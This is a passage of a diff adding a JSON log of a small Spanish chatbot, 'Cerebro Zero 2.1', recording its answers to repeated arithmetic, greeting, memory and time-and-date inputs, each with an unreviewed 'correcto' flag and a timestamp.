+      "fecha": "2026-09-17T15:06:56.189962"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 7 + 3?",
+      "salida": "7.0 + 3.0 = 10.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.191295"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 8 - 2?",
+      "salida": "8.0 - 2.0 = 6.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.193040"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 4 * 4?",
+      "salida": "4.0 * 4.0 = 16.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.194543"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 2 + 3?",
+      "salida": "2.0 + 3.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.196046"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 - 4?",
+      "salida": "5.0 - 4.0 = 1.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.197482"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 3 * 3?",
+      "salida": "3.0 * 3.0 = 9.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.198934"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 10 / 2?",
+      "salida": "10.0 / 2.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.200427"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 1 + 1?",
+      "salida": "1.0 + 1.0 = 2.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.201869"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 7 + 3?",
+      "salida": "7.0 + 3.0 = 10.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.203311"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 71 * 16?",
+      "salida": "71.0 * 16.0 = 1136.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.204932"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 91 - 8?",
+      "salida": "91.0 - 8.0 = 83.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.206463"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 94 + 12?",
+      "salida": "94.0 + 12.0 = 106.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.208421"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 43 - 4?",
+      "salida": "43.0 - 4.0 = 39.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.210318"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 72 - 3?",
+      "salida": "72.0 - 3.0 = 69.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.212386"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 57 + 3?",
+      "salida": "57.0 + 3.0 = 60.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.214187"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 52 - 13?",
+      "salida": "52.0 - 13.0 = 39.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.216483"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 41 + 13?",
+      "salida": "41.0 + 13.0 = 54.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.218232"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 68 * 11?",
+      "salida": "68.0 * 11.0 = 748.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.220021"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 81 - 16?",
+      "salida": "81.0 - 16.0 = 65.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.221784"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 70 * 13?",
+      "salida": "70.0 * 13.0 = 910.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.223563"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 83 + 4?",
+      "salida": "83.0 + 4.0 = 87.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.225710"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 70 + 8?",
+      "salida": "70.0 + 8.0 = 78.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.227694"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 92 - 8?",
+      "salida": "92.0 - 8.0 = 84.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.229642"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 23 - 15?",
+      "salida": "23.0 - 15.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.231548"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 28 * 3?",
+      "salida": "28.0 * 3.0 = 84.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.233537"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 79 + 8?",
+      "salida": "79.0 + 8.0 = 87.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.235465"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 27 * 16?",
+      "salida": "27.0 * 16.0 = 432.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.237450"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 97 - 18?",
+      "salida": "97.0 - 18.0 = 79.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.239381"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 23 - 3?",
+      "salida": "23.0 - 3.0 = 20.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.241664"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 25 - 11?",
+      "salida": "25.0 - 11.0 = 14.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.243895"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 82 - 19?",
+      "salida": "82.0 - 19.0 = 63.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.245989"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 63 - 3?",
+      "salida": "63.0 - 3.0 = 60.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.248157"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 81 - 5?",
+      "salida": "81.0 - 5.0 = 76.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.250301"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 67 - 16?",
+      "salida": "67.0 - 16.0 = 51.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.252450"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 81 + 9?",
+      "salida": "81.0 + 9.0 = 90.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.254589"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 99 - 14?",
+      "salida": "99.0 - 14.0 = 85.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.256835"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 72 + 14?",
+      "salida": "72.0 + 14.0 = 86.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.259354"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 48 + 16?",
+      "salida": "48.0 + 16.0 = 64.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.261784"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 84 + 8?",
+      "salida": "84.0 + 8.0 = 92.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.264179"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 0 + 0?",
+      "salida": "0.0 + 0.0 = 0.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.266565"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 0 * 9999?",
+      "salida": "0.0 * 9999.0 = 0.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.268955"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es -5 + 10?",
+      "salida": "-5.0 + 10.0 = 5.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.271313"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 100 - 200?",
+      "salida": "100.0 - 200.0 = -100.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.273718"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 99 * 0?",
+      "salida": "99.0 * 0.0 = 0.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.276644"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.279933"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.282757"
+    },
+    {
+      "entrada": "buenas tardes",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.285525"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.288123"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.290708"
+    },
+    {
+      "entrada": "buenas tardes",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.293626"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.296461"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.299140"
+    },
+    {
+      "entrada": "buenas tardes",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.301830"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.304580"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.307302"
+    },
+    {
+      "entrada": "buenas tardes",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.310364"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.313229"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.316041"
+    },
+    {
+      "entrada": "buenas tardes",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.318810"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.322033"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.325433"
+    },
+    {
+      "entrada": "buenas tardes",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.328480"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.331365"
+    },
+    {
+      "entrada": "buenos d\u00edas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.334283"
+    },
+    {
+      "entrada": "qu\u00e9 tal",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.337303"
+    },
+    {
+      "entrada": "hey",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.340305"
+    },
+    {
+      "entrada": "saludos",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.343639"
+    },
+    {
+      "entrada": "buenas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.346721"
+    },
+    {
+      "entrada": "qu\u00e9 pasa",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.350395"
+    },
+    {
+      "entrada": "qu\u00e9 tal",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.353509"
+    },
+    {
+      "entrada": "hey",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.356599"
+    },
+    {
+      "entrada": "saludos",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.360077"
+    },
+    {
+      "entrada": "buenas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.363258"
+    },
+    {
+      "entrada": "qu\u00e9 pasa",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.366464"
+    },
+    {
+      "entrada": "qu\u00e9 tal",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.369985"
+    },
+    {
+      "entrada": "hey",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.373389"
+    },
+    {
+      "entrada": "saludos",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.377062"
+    },
+    {
+      "entrada": "buenas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.380481"
+    },
+    {
+      "entrada": "qu\u00e9 pasa",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.383833"
+    },
+    {
+      "entrada": "qu\u00e9 tal",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.387226"
+    },
+    {
+      "entrada": "hey",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.390649"
+    },
+    {
+      "entrada": "saludos",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.394389"
+    },
+    {
+      "entrada": "buenas",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.397912"
+    },
+    {
+      "entrada": "qu\u00e9 pasa",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.401414"
+    },
+    {
+      "entrada": "hola adi\u00f3s hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.404978"
+    },
+    {
+      "entrada": "no hola",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.409987"
+    },
+    {
+      "entrada": "\u00bfhola?",
+      "salida": "hola \u2192 Hola, \u00bfqu\u00e9 tal?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.414377"
+    },
+    {
+      "entrada": "HOLA MUNDO",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.418162"
+    },
+    {
+      "entrada": "h o l a",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.422218"
+    },
+    {
+      "entrada": "recuerda x = ",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.886323"
+    },
+    {
+      "entrada": "recuerda = valor",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.891856"
+    },
+    {
+      "entrada": "recordar clave_que_no_existe",
+      "salida": "\u2753 No recuerdo 'clave_que_no_existe'",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.898291"
+    },
+    {
+      "entrada": "recuerda 3.14 = pi",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.904211"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.925286"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.930073"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.934750"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.939252"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.944014"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.948897"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.953641"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.958294"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.963209"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.968010"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.972806"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.977603"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.982617"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.987669"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:56",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.992701"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:56.997885"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.002771"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.007614"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.012529"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 fecha es hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.017568"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.022524"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.027656"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.032876"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.038059"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.043193"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.048675"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.053999"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.059199"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.064753"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.070165"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.076516"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.082167"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.087668"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.093007"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.098519"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.103973"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.109367"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.114938"
+    },
+    {
+      "entrada": "dime la hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.120521"
+    },
+    {
+      "entrada": "dime la fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.125920"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto son las 5?",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.132611"
+    },
+    {
